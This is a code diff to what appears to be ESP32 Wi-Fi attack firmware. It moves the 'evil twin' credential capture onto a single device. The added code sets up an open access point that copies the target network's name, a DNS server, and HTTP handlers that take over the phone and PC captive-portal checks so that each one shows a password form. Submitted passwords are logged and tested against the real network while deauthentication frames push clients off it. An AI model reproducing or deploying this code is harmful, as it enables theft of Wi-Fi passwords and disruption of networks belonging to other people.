@@ -19,7 +19,6 @@
 #include "esp_wifi.h"
 #include "esp_event.h"
 
-#include "esp_now.h"
 #include "esp_mac.h"
 
 #include "esp_console.h"
@@ -200,8 +199,6 @@ static const wifi_promiscuous_filter_t sniffer_filter = {
 static char wardrive_gps_buffer[GPS_BUF_SIZE];
 static wifi_ap_record_t wardrive_scan_results[MAX_AP_CNT];
 
-//Target (ESP32) MAC of the other device (ESP32):
-uint8_t esp32_mac[] = {0xCC, 0x8D, 0xA2, 0xEC, 0xEF, 0x38};
 
 
 /**
@@ -280,6 +277,13 @@ static void blackout_attack_task(void *pvParameters);
 static void sae_attack_task(void *pvParameters);
 // DNS server task
 static void dns_server_task(void *pvParameters);
+// Portal HTTP handlers
+static esp_err_t root_handler(httpd_req_t *req);
+static esp_err_t portal_handler(httpd_req_t *req);
+static esp_err_t login_handler(httpd_req_t *req);
+static esp_err_t android_captive_handler(httpd_req_t *req);
+static esp_err_t ios_captive_handler(httpd_req_t *req);
+static esp_err_t captive_detection_handler(httpd_req_t *req);
 // Sniffer functions
 static void sniffer_promiscuous_callback(void *buf, wifi_promiscuous_pkt_type_t type);
 static void sniffer_process_scan_results(void);
@@ -363,11 +367,7 @@ static void wifi_event_handler(void *event_handler_arg,
                                int32_t event_id,
                                void *event_data);
 
-static void espnow_recv_cb(const esp_now_recv_info_t *recv_info, const uint8_t *data, int len);
-static void espnow_send_cb(const esp_now_send_info_t *send_info, esp_now_send_status_t status);
-
 static esp_err_t wifi_init_ap_sta(void);
-static esp_err_t espnow_init(void);
 static void register_commands(void);
 
 // --- Wi-Fi event handler ---
@@ -568,23 +568,16 @@ static void wifi_event_handler(void *event_handler_arg,
     }
 }
 
-// --- ESP-NOW callbacks ---
-static void espnow_recv_cb(const esp_now_recv_info_t *recv_info, const uint8_t *data, int len) {
-    char msg[len + 1];
-    memcpy(msg, data, len);
-    msg[len] = '\0';
-
-    evilTwinPassword = malloc(len + 1);
+// --- Password verification function (used by portal) ---
+static void verify_password(const char* password) {
+    evilTwinPassword = malloc(strlen(password) + 1);
     if (evilTwinPassword != NULL) {
-        strcpy(evilTwinPassword, msg);
+        strcpy(evilTwinPassword, password);
     } else {
-        ESP_LOGW(TAG,"Malloc error 4 password");
+        ESP_LOGW(TAG,"Malloc error for password");
     }
 
-    MY_LOG_INFO(TAG, "Received from: %02X:%02X:%02X:%02X:%02X:%02X",
-             recv_info->src_addr[0], recv_info->src_addr[1], recv_info->src_addr[2],
-             recv_info->src_addr[3], recv_info->src_addr[4], recv_info->src_addr[5]);
-    MY_LOG_INFO(TAG, "Message: %s", msg);
+    MY_LOG_INFO(TAG, "Password received: %s", password);
 
     //Now, let's check if it's a password for Evil Twin:
     applicationState = EVIL_TWIN_PASS_CHECK;
@@ -593,22 +586,14 @@ static void espnow_recv_cb(const esp_now_recv_info_t *recv_info, const uint8_t *
     wifi_config_t sta_config = { 0 };  
     strncpy((char *)sta_config.sta.ssid, evilTwinSSID, sizeof(sta_config.sta.ssid));
     sta_config.sta.ssid[sizeof(sta_config.sta.ssid) - 1] = '\0'; // null-terminate
-    strncpy((char *)sta_config.sta.password, msg, sizeof(sta_config.sta.password));
+    strncpy((char *)sta_config.sta.password, password, sizeof(sta_config.sta.password));
     sta_config.sta.password[sizeof(sta_config.sta.password) - 1] = '\0'; // null-terminate
     esp_wifi_set_config(WIFI_IF_STA, &sta_config);
     vTaskDelay(pdMS_TO_TICKS(2000));
-    MY_LOG_INFO(TAG, "Received connect command from ESP32 to SSID='%s' with password='%s'", evilTwinSSID, msg);
+    MY_LOG_INFO(TAG, "Attempting to connect to SSID='%s' with password='%s'", evilTwinSSID, password);
     connectAttemptCount = 0;
     MY_LOG_INFO(TAG, "Attempting to connect, connectAttemptCount=%d", connectAttemptCount);
     esp_wifi_connect();
-}
-
-static void espnow_send_cb(const esp_now_send_info_t *send_info, esp_now_send_status_t status) {
-    const uint8_t *mac_addr = send_info->des_addr;
-    MY_LOG_INFO(TAG, "Sent to %02X:%02X:%02X:%02X:%02X:%02X, status: %s",
-             mac_addr[0], mac_addr[1], mac_addr[2],
-             mac_addr[3], mac_addr[4], mac_addr[5],
-             status == ESP_NOW_SEND_SUCCESS ? "OK" : "ERROR");
 }
 
 // --- Wi-Fi initialization (STA, no connection yet) ---
@@ -661,26 +646,6 @@ static esp_err_t wifi_init_ap_sta(void) {
     return ESP_OK;
 }
 
-// --- Initialize ESP-NOW ---
-static esp_err_t espnow_init(void) {
-    
-    ESP_ERROR_CHECK(esp_now_init());
-    ESP_ERROR_CHECK(esp_now_register_recv_cb(espnow_recv_cb));
-    ESP_ERROR_CHECK(esp_now_register_send_cb(espnow_send_cb));
-
-
-    esp_now_peer_info_t peer = {
-        .peer_addr = {0},
-        .channel = 1,
-        .encrypt = false,
-    };
-    memcpy(peer.peer_addr, esp32_mac, 6);
-    if (esp_now_add_peer(&peer) != ESP_OK) {
-        ESP_LOGE(TAG, "Failed to add peer");
-    }
-    return ESP_OK;
-    MY_LOG_INFO(TAG, "Peer added");
-}
 
 // --- Start background scan ---
 static esp_err_t start_background_scan(void) {
@@ -1376,10 +1341,9 @@ static int cmd_start_blackout(int argc, char **argv) {
 }
 
 /*
-0) Sends the first network name over ESP-NOW to ESP32
-1) Starts a stream of deauth pockets sent to all target networks. 
-2) Listens for password to try over ESP-NOW
-3) When password arrives, stops deauth stream and attempts to connect to a network
+0) Starts captive portal to collect password
+1) Starts a stream of deauth packets sent to all target networks. 
+2) When password is entered in portal, stops deauth stream and attempts to connect to a network
 
 */
 static int cmd_start_evil_twin(int argc, char **argv) {
@@ -1411,16 +1375,183 @@ static int cmd_start_evil_twin(int argc, char **argv) {
             ESP_LOGW(TAG,"Malloc error 4 SSID");
         }
 
-        //send evil ssid to ESP32 via ESP-NOW
+        // Start portal before starting deauth attack
         if (!onlyDeauth) {
-            char msg[100];
-            sprintf(msg, "#()^7841%%_%s", evilTwinSSID);
-            esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
-            vTaskDelay(pdMS_TO_TICKS(100));
-            ESP_ERROR_CHECK(esp_now_send(esp32_mac, (uint8_t *)msg, strlen(msg)));
-            MY_LOG_INFO(TAG,"Evil twin: %s", evilTwinSSID);
+            MY_LOG_INFO(TAG,"Starting captive portal for Evil Twin attack on: %s", evilTwinSSID);
+            
+            // Get AP netif and stop DHCP to configure custom IP
+            esp_netif_t *ap_netif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
+            if (!ap_netif) {
+                MY_LOG_INFO(TAG, "Failed to get AP netif");
+                applicationState = IDLE;
+                return 1;
+            }
+            
+            // Stop DHCP server to configure custom IP
+            esp_netif_dhcps_stop(ap_netif);
+            
+            // Set static IP 172.0.0.1 for AP
+            esp_netif_ip_info_t ip_info;
+            ip_info.ip.addr = esp_ip4addr_aton("172.0.0.1");
+            ip_info.gw.addr = esp_ip4addr_aton("172.0.0.1");
+            ip_info.netmask.addr = esp_ip4addr_aton("255.255.255.0");
+            
+            esp_err_t ret = esp_netif_set_ip_info(ap_netif, &ip_info);
+            if (ret != ESP_OK) {
+                MY_LOG_INFO(TAG, "Failed to set AP IP: %s", esp_err_to_name(ret));
+                applicationState = IDLE;
+                return 1;
+            }
+            
+            MY_LOG_INFO(TAG, "AP IP set to 172.0.0.1");
+            
+            // Configure AP with Evil Twin SSID
+            wifi_config_t ap_config = {
+                .ap = {
+                    .ssid = "",
+                    .ssid_len = 0,
+                    .channel = 1,
+                    .password = "",
+                    .max_connection = 4,
+                    .authmode = WIFI_AUTH_OPEN
+                }
+            };
+            strncpy((char*)ap_config.ap.ssid, evilTwinSSID, sizeof(ap_config.ap.ssid));
+            ap_config.ap.ssid_len = strlen(evilTwinSSID);
+            
+            // WiFi is already running in APSTA mode from wifi_init_ap_sta()
+            // Just update the AP configuration
+            ret = esp_wifi_set_config(WIFI_IF_AP, &ap_config);
+            if (ret != ESP_OK) {
+                MY_LOG_INFO(TAG, "Failed to set AP config: %s", esp_err_to_name(ret));
+                applicationState = IDLE;
+                return 1;
+            }
+            
+            MY_LOG_INFO(TAG, "AP configuration updated with Evil Twin SSID");
+            
+            // Start DHCP server
+            ret = esp_netif_dhcps_start(ap_netif);
+            if (ret != ESP_OK) {
+                MY_LOG_INFO(TAG, "Failed to start DHCP server: %s", esp_err_to_name(ret));
+                applicationState = IDLE;
+                return 1;
+            }
+            
+            MY_LOG_INFO(TAG, "DHCP server started - clients will get IPs in 172.0.0.x range");
+            
+            // Wait a bit for AP to fully start
+            vTaskDelay(pdMS_TO_TICKS(1000));
+            
+            // Configure HTTP server
+            httpd_config_t config = HTTPD_DEFAULT_CONFIG();
+            config.server_port = 80;
+            config.max_open_sockets = 7;
+            
+            // Start HTTP server
+            esp_err_t http_ret = httpd_start(&portal_server, &config);
+            if (http_ret != ESP_OK) {
+                MY_LOG_INFO(TAG, "Failed to start HTTP server: %s", esp_err_to_name(http_ret));
+                // Stop DHCP before returning
+                esp_netif_dhcps_stop(ap_netif);
+                applicationState = IDLE;
+                return 1;
+            }
+            
+            MY_LOG_INFO(TAG, "HTTP server started successfully on port 80");
+            
+            // Register URI handlers
+            httpd_uri_t root_uri = {
+                .uri = "/",
+                .method = HTTP_GET,
+                .handler = root_handler,
+                .user_ctx = NULL
+            };
+            httpd_register_uri_handler(portal_server, &root_uri);
+            
+            httpd_uri_t root_post_uri = {
+                .uri = "/",
+                .method = HTTP_POST,
+                .handler = root_handler,
+                .user_ctx = NULL
+            };
+            httpd_register_uri_handler(portal_server, &root_post_uri);
+            
+            httpd_uri_t portal_uri = {
+                .uri = "/portal",
+                .method = HTTP_GET,
+                .handler = portal_handler,
+                .user_ctx = NULL
+            };
+            httpd_register_uri_handler(portal_server, &portal_uri);
+            
+            httpd_uri_t login_uri = {
+                .uri = "/login",
+                .method = HTTP_POST,
+                .handler = login_handler,
+                .user_ctx = NULL
+            };
+            httpd_register_uri_handler(portal_server, &login_uri);
+            
+            httpd_uri_t android_captive_uri = {
+                .uri = "/generate_204",
+                .method = HTTP_GET,
+                .handler = android_captive_handler,
+                .user_ctx = NULL
+            };
+            httpd_register_uri_handler(portal_server, &android_captive_uri);
+            
+            httpd_uri_t ios_captive_uri = {
+                .uri = "/hotspot-detect.html",
+                .method = HTTP_GET,
+                .handler = ios_captive_handler,
+                .user_ctx = NULL
+            };
+            httpd_register_uri_handler(portal_server, &ios_captive_uri);
+            
+            httpd_uri_t samsung_captive_uri = {
+                .uri = "/ncsi.txt",
+                .method = HTTP_GET,
+                .handler = captive_detection_handler,
+                .user_ctx = NULL
+            };
+            httpd_register_uri_handler(portal_server, &samsung_captive_uri);
+            
+            httpd_uri_t windows_captive_uri = {
+                .uri = "/connecttest.txt",
+                .method = HTTP_GET,
+                .handler = captive_detection_handler,
+                .user_ctx = NULL
+            };
+            httpd_register_uri_handler(portal_server, &windows_captive_uri);
+            
+            MY_LOG_INFO(TAG, "All URI handlers registered");
+            
+            // Set portal_active flag BEFORE starting DNS task
+            // (DNS task checks this flag in its loop)
+            portal_active = true;
+            
+            // Start DNS server task
+            BaseType_t dns_result = xTaskCreate(
+                dns_server_task,
+                "dns_server",
+                4096,
+                NULL,
+                5,
+                &dns_server_task_handle
+            );
+            
+            if (dns_result != pdPASS) {
+                MY_LOG_INFO(TAG, "Failed to create DNS server task");
+                httpd_stop(portal_server);
+                portal_server = NULL;
+                portal_active = false;
+                applicationState = IDLE;
+                return 1;
+            }
+            
+            MY_LOG_INFO(TAG, "Captive portal started successfully");
         }
-
 
         MY_LOG_INFO(TAG,"Attacking %d network(s):", g_selected_count);
         for (int i = 0; i < g_selected_count; ++i) {
@@ -2171,6 +2302,11 @@ static esp_err_t login_handler(httpd_req_t *req) {
         
         // Log the password
         MY_LOG_INFO(TAG, "Portal password received: %s", decoded_password);
+        
+        // If in evil twin mode, verify the password
+        if (applicationState == DEAUTH_EVIL_TWIN && evilTwinSSID != NULL) {
+            verify_password(decoded_password);
+        }
     }
     
     // Send success response
@@ -2223,33 +2359,7 @@ static esp_err_t root_handler(httpd_req_t *req) {
     httpd_resp_set_hdr(req, "Connection", "close");
     httpd_resp_set_hdr(req, "Content-Type", "text/html; charset=utf-8");
     
-    // Check User-Agent for Android/Samsung
-    size_t user_agent_len = httpd_req_get_hdr_value_len(req, "User-Agent");
-    if (user_agent_len > 0) {
-        char user_agent[256];
-        if (httpd_req_get_hdr_value_str(req, "User-Agent", user_agent, sizeof(user_agent)) == ESP_OK) {
-            MY_LOG_INFO(TAG, "User-Agent: %s", user_agent);
-            
-            // If it's Android/Samsung, send special response
-            if (strstr(user_agent, "Android") || strstr(user_agent, "Samsung")) {
-                MY_LOG_INFO(TAG, "Android/Samsung device detected - sending captive portal response");
-                
-                // Send special response for Android captive portal detection
-                const char* android_response = 
-                    "<!DOCTYPE html><html><head><title>Portal</title></head>"
-                    "<body><h1>Portal Access Required</h1>"
-                    "<p>Please enter your password to continue.</p>"
-                    "<form method='POST' action='/login'>"
-                    "<input type='password' name='password' placeholder='Podaj hasło' required>"
-                    "<button type='submit'>Zaloguj</button>"
-                    "</form></body></html>";
-                
-                httpd_resp_send(req, android_response, HTTPD_RESP_USE_STRLEN);
-                return ESP_OK;
-            }
-        }
-    }
-    
+    // Always return the portal HTML with password form
     httpd_resp_set_type(req, "text/html");
     httpd_resp_send(req, portal_html, HTTPD_RESP_USE_STRLEN);
     return ESP_OK;
@@ -2280,17 +2390,16 @@ static esp_err_t ios_captive_handler(httpd_req_t *req) {
     MY_LOG_INFO(TAG, "iOS captive portal detection: %s", req->uri);
     MY_LOG_INFO(TAG, "iOS handler called - this means client is trying to detect captive portal!");
     
-    // iOS expects specific content for captive portal detection
-    const char* ios_response = 
-        "<!DOCTYPE html><html><head><title>Success</title></head>"
-        "<body><h1>Success</h1></body></html>";
-    
+    // iOS detects captive portal when this endpoint returns something other than "Success"
+    // So we return our portal HTML with password form to trigger captive portal popup
+    httpd_resp_set_status(req, "200 OK");
     httpd_resp_set_hdr(req, "Cache-Control", "no-cache, no-store, must-revalidate");
     httpd_resp_set_hdr(req, "Pragma", "no-cache");
     httpd_resp_set_hdr(req, "Expires", "0");
     httpd_resp_set_hdr(req, "Content-Type", "text/html");
     
-    httpd_resp_send(req, ios_response, HTTPD_RESP_USE_STRLEN);
+    // Send our portal HTML to show password form
+    httpd_resp_send(req, portal_html, HTTPD_RESP_USE_STRLEN);
     return ESP_OK;
 }
 
@@ -2304,42 +2413,9 @@ static esp_err_t captive_detection_handler(httpd_req_t *req) {
     httpd_resp_set_hdr(req, "Expires", "0");
     httpd_resp_set_hdr(req, "Connection", "close");
     
-    // Check User-Agent for Android/Samsung
-    size_t user_agent_len = httpd_req_get_hdr_value_len(req, "User-Agent");
-    if (user_agent_len > 0) {
-        char user_agent[256];
-        if (httpd_req_get_hdr_value_str(req, "User-Agent", user_agent, sizeof(user_agent)) == ESP_OK) {
-            MY_LOG_INFO(TAG, "User-Agent: %s", user_agent);
-            
-            // If it's Android/Samsung, send special response
-            if (strstr(user_agent, "Android") || strstr(user_agent, "Samsung")) {
-                MY_LOG_INFO(TAG, "Android/Samsung device detected - sending captive portal response");
-                
-                // Send special response for Android captive portal detection
-                const char* android_response = 
-                    "<!DOCTYPE html><html><head><title>Portal</title></head>"
-                    "<body><h1>Portal Access Required</h1>"
-                    "<p>Please enter your password to continue.</p>"
-                    "<form method='POST' action='/login'>"
-                    "<input type='password' name='password' placeholder='Podaj hasło' required>"
-                    "<button type='submit'>Zaloguj</button>"
-                    "</form></body></html>";
-                
-                httpd_resp_send(req, android_response, HTTPD_RESP_USE_STRLEN);
-                return ESP_OK;
-            }
-        }
-    }
-    
-    // Return a simple response that indicates this is a captive portal
-    const char* response = 
-        "HTTP/1.1 200 OK\r\n"
-        "Content-Type: text/html\r\n"
-        "Content-Length: 200\r\n\r\n"
-        "<!DOCTYPE html><html><head><title>Captive Portal</title></head>"
-        "<body><h1>Portal Detected</h1><p>Please visit <a href='/portal'>/portal</a> to continue.</p></body></html>";
-    
-    httpd_resp_send(req, response, HTTPD_RESP_USE_STRLEN);
+    // Always return the portal HTML with password form
+    httpd_resp_set_type(req, "text/html");
+    httpd_resp_send(req, portal_html, HTTPD_RESP_USE_STRLEN);
     return ESP_OK;
 }
 
@@ -2933,8 +3009,7 @@ void app_main(void) {
 
     ESP_ERROR_CHECK(nvs_flash_init());
 
-    ESP_ERROR_CHECK(wifi_init_ap_sta());
-    ESP_ERROR_CHECK(espnow_init()); 
+    ESP_ERROR_CHECK(wifi_init_ap_sta()); 
 
     wifi_country_t wifi_country = {
         .cc = "PH",
@@ -2990,22 +3065,7 @@ void wsl_bypasser_send_deauth_frame_multiple_aps(wifi_ap_record_t *ap_records, s
         return;
     }
 
-    if (!onlyDeauth) {
-        //first, spend some time waiting for ESP-NOW signal that password has been provided which is expected on channel 1:
-        esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
-        //MY_LOG_INFO(TAG, "Waiting for ESP-NOW signal on channel 1 before deauth...");
-        
-        // Wait in smaller chunks to allow UART processing
-        for (int wait = 0; wait < 300; wait += 50) {
-            vTaskDelay(pdMS_TO_TICKS(50));
-            if (operation_stop_requested) {
-                return; // Exit early if stop requested
-            }
-        }
-        //MY_LOG_INFO(TAG, "Finished waiting for ESP-NOW...");
-    }
-
-    //then, proceed with deauth frames on channels of the APs:
+    //proceed with deauth frames on channels of the APs:
     // Use target_bssids[] directly to avoid index confusion after periodic re-scan
     for (int i = 0; i < target_bssid_count; ++i) {
         if (applicationState == EVIL_TWIN_PASS_CHECK ) {
